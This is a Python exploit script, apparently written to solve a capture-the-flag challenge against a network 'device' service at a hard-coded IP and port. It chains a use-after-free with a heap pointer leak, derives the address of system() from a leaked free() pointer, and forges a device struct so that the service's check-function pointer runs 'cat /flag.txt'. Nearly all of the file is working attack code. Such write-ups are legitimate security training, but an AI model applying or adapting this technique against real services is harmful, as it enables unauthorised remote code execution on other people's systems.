import socket
import time

HOST = "54.234.239.99"  # Change to challenge IP
PORT = 41414        # Port service is listening on

DEV_NAME = 16
DEV_SIZE = 71

system_offset_free = 0x555E0

class DeviceMessage:
    def __init__(self, choice, uid, name="", register_data=b'\x00'):
        self.choice = choice
        self.uid = uid
        self.name = name
        self.register_data_size = len(register_data)
        self.register_data = register_data

    def to_bytes(self):
        """Serialize the object to bytes with varying formats based on choice."""

        choice = self.choice
        choice_bytes = str(self.choice).encode("ascii") + b"\n"
        uid_bytes = str(self.uid).encode("ascii") + b"\n"
        data_size_bytes = str(self.register_data_size).encode("ascii") + b"\n"
        
        # Ensure the name is exactly 16 bytes (padded or truncated)
        if len(self.name) > DEV_NAME:
            name_bytes = self.name[:DEV_NAME].encode("ascii")
        else:
            name_bytes = self.name.encode("ascii").ljust(DEV_NAME, b"\x00")

        # Initialize device
        if choice == 1:
            serialized_data = choice_bytes + uid_bytes + name_bytes
        # Clone device, check device function, unregister device data, display device statistics, or close device
        elif choice in (2, 4, 5, 6, 7):
            serialized_data = choice_bytes + uid_bytes
        # Register device data
        elif choice == 3:
            serialized_data = choice_bytes + uid_bytes + data_size_bytes + self.register_data
        # Check device function
        else:
            serialized_data = b''

        return serialized_data

def bytes_to_hex(byte_data):
    """Convert bytes to a hexadecimal string for debugging."""
    return " ".join(f"{b:02x}" for b in byte_data)


def get_leak(client_socket):
    """Read and display all lines from the service."""

    data_stream = b"Prepare for data stream:\n"
    while True:
        # Read up to 1024 bytes
        response = client_socket.recv(1024)
        if not response:  # Connection closed or no more data
            break

        if data_stream in response:
            start_index = response.index(data_stream) + len(data_stream)
    
        # Extract the next 63 bytes after data_stream
            next_63_bytes = response[start_index:start_index + 71]
    
            return next_63_bytes


def print_response(client_socket):
    """
    Reads and prints output from the client line by line.

    Args:
        client_socket: The socket object connected to the client.
    """
    # Keep reading until the client disconnects or sends no more data
    try:
        buffer = b""  # Accumulate partial lines
        while True:
            # Receive data from the client
            data = client_socket.recv(1024)  # Adjust buffer size if needed
            if not data:
                # Break if the client has disconnected
                #print("Client disconnected.")
                break

            # Add received data to the buffer
            buffer += data

            # Split the buffer into lines
            lines = buffer.split(b"\n")

            # Keep the last part (incomplete line) in the buffer
            buffer = lines.pop()

            # Print each complete line
            for line in lines:
                print(line.decode("utf-8", errors="replace"))  # Decode bytes to string
    except Exception as e:
        print(f"An error occurred: {e}")

def fake_device_bytes(next_ptr=0, uid=0, name="", free=0, check=0, access_count=1, used_slots=0, free_slots=DEV_SIZE+1, data=0):
    next_bytes = next_ptr.to_bytes(8, byteorder='little', signed=False)
    uid_bytes = uid.to_bytes(4, byteorder='little', signed=False)
    free_bytes = free.to_bytes(8, byteorder='little', signed=False)
    check_bytes = check.to_bytes(8, byteorder='little', signed=False)
    access_count_bytes = access_count.to_bytes(4, byteorder='little', signed=False)
    used_slots_bytes = used_slots.to_bytes(4, byteorder='little', signed=False)
    free_slots_bytes = free_slots.to_bytes(4, byteorder='little', signed=False)
    padding = b"\x00\x00\x00\x00"
    data_bytes = data.to_bytes(7, byteorder='little', signed=False)


    if len(name) > DEV_NAME:
        name_bytes = name[:DEV_NAME].encode("ascii")
    else:
        name_bytes = name.encode("ascii").ljust(DEV_NAME, b"\x00")

    fake_device = next_bytes + uid_bytes + name_bytes + padding + free_bytes + check_bytes + access_count_bytes+ used_slots_bytes + free_slots_bytes + padding + data_bytes

    return fake_device

def main():
    
    device_data = b"A" * DEV_SIZE
    shell_data  = b'cat /flag.txt' + b'\0'
    init_device  = DeviceMessage(choice=1, uid=1337, name="ExampleDevice")
    register_data = DeviceMessage(choice=3, uid= 1337, register_data = device_data)
    clone_device = DeviceMessage(choice=2, uid=1337)
    unregister_data = DeviceMessage(choice=5, uid=1337)
    init_uaf_device = DeviceMessage(choice=1, uid=333, name = "lol hello")
    register_uaf_device = DeviceMessage(choice=3, uid=333, register_data = shell_data)
    close_device = DeviceMessage(choice=7, uid=1337)
    check_device = DeviceMessage(choice=4, uid=1337)

    device_statistics = DeviceMessage(choice=6, uid=1337)

    buffer = init_device.to_bytes() + register_data.to_bytes() + clone_device.to_bytes() + unregister_data.to_bytes() + init_uaf_device.to_bytes() + register_uaf_device.to_bytes() + close_device.to_bytes() + check_device.to_bytes()

    try:
        # Create a socket to connect to the service
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            # Connect to the service
            client_socket.connect((HOST, PORT))
            print(f"Connected to service on {HOST}:{PORT}")

            client_socket.sendall(buffer)

            time.sleep(3)

            byt = get_leak(client_socket)

            data_addr_byte = byt[64:72]
            free_addr_byte = byt[32:40]

            free_addr = int.from_bytes(free_addr_byte, byteorder='little', signed=False)
            data_addr = int.from_bytes(data_addr_byte, byteorder='little', signed=False)
            
            system_addr = free_addr - system_offset_free

            print(f"free addr {hex(free_addr)} cmd addr{hex(data_addr)} system{hex(system_addr)}")

            check_fake_device = DeviceMessage(choice=4, uid = 333)

            fake_device = fake_device_bytes(uid=333, name="who cares", check=system_addr, used_slots=len(shell_data), free_slots=DEV_SIZE+1-len(shell_data), data=data_addr)

            register_data = DeviceMessage(choice=3, uid= 1337, register_data = fake_device)
            buffer2 = unregister_data.to_bytes() + register_data.to_bytes() + check_fake_device.to_bytes()
            client_socket.sendall(buffer2)



            while True:
                print_response(client_socket)



    except ConnectionRefusedError:
        print(f"Could not connect to the service on {HOST}:{PORT}. Is it running?")
    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
